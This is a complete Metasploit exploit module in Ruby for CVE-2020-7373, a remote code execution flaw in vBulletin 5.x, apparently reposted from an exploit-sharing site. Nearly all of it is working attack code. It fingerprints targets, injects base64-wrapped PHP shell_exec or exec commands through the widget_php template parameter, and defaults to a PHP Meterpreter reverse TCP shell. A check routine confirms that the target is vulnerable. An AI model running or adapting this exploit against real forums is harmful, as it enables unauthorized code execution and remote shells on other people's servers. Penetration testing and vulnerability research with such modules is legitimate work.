##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
 
  HttpFingerprint = { method: 'GET', uri: '/', pattern: [/vBulletin.version = '5.+'/] }
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'vBulletin 5.x /ajax/render/widget_tabbedcontainer_tab_panel PHP remote code execution.',
        'Description' => %q{
          This module exploits a logic bug within the template rendering code in vBulletin 5.x.
          The module uses the vBulletin template rendering functionality to render the
          'widget_tabbedcontainer_tab_panel' template while also providing the 'widget_php' argument.
          This causes the former template to load the latter bypassing filters originally put in place
          to address 'CVE-2019-16759'. This also allows the exploit to reach an eval call with user input
          allowing the module to achieve PHP remote code execution on the target. This module has been
          tested successfully on vBulletin version 5.6.2 on Ubuntu Linux.
        },
        'Author' => [
          'Zenofex <zenofex[at]exploitee.rs>' # (@zenofex) PoC and Metasploit module
        ],
        'References' => [
          ['URL', 'https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/'],
          ['CVE', '2020-7373']
        ],
        'DisclosureDate' => '2020-08-09',
        'License' => MSF_LICENSE,
        'Platform' => ['php', 'unix', 'windows'],
        'Arch' => [ARCH_CMD, ARCH_PHP],
        'Privileged' => true,
        'Targets' => [
          [
            'Meterpreter (PHP In-Memory)',
            'Platform' => 'php',
            'Arch' => [ARCH_PHP],
            'Type' => :php_memory,
            'DefaultOptions' => {
              'PAYLOAD' => 'php/meterpreter/reverse_tcp',
              'DisablePayloadHandler' => false
            }
          ],
          [
            'Unix (CMD In-Memory)',
            'Platform' => 'unix',
            'Arch' => ARCH_CMD,
            'Type' => :unix_cmd,
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/generic',
              'DisablePayloadHandler' => true
            }
          ],
          [
            'Windows (CMD In-Memory)',
            'Platform' => 'windows',
            'Arch' => ARCH_CMD,
            'Type' => :windows_cmd,
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/windows/generic',
              'DisablePayloadHandler' => true
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
 
    register_options([
      OptString.new('TARGETURI', [true, 'The URI of the vBulletin base path', '/']),
      OptEnum.new('PHP_CMD', [true, 'Specify the PHP function in which you want to execute the payload.', 'shell_exec', ['shell_exec', 'exec']])
    ])
 
  end
 
  def cmd_payload(command)
    "echo #{datastore['PHP_CMD']}(base64_decode('#{Rex::Text.encode_base64(command)}')); exit;"
  end
 
  def execute_command(command)
    response = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/ajax/render/widget_tabbedcontainer_tab_panel'),
      'encode_params' => true,
      'vars_post' => {
        'subWidgets[0][template]' => 'widget_php',
        'subWidgets[0][config][code]' => command
      }
    })
    if response && response.body
      return response
    end
 
    false
  end
 
  def check
    rand_str = Rex::Text.rand_text_alpha(8)
    received = execute_command(cmd_payload("echo #{rand_str}"))
    if received && received.body.include?(rand_str)
      return Exploit::CheckCode::Vulnerable
    end
 
    Exploit::CheckCode::Safe
  end
 
  def exploit
    print_status("Sending #{datastore['PAYLOAD']} command payload")
    case target['Type']
    when :unix_cmd, :windows_cmd
      cmd = cmd_payload(payload.encoded)
      vprint_status("Generated command payload: #{cmd}")
 
      received = execute_command(cmd)
      if received && (datastore['PAYLOAD'] == "cmd/#{target['Platform']}/generic")
        print_warning('Dumping command output in body response')
        if received.body.empty?
          print_error('Empty response, no command output')
          return
        end
        print_line(received.body.to_s)
      end
 
    when :php_memory
      vprint_status("Generated command payload: #{payload.encoded}")
      execute_command(payload.encoded)
    end
  end
end
 
#  0day.today [2020-08-19]  #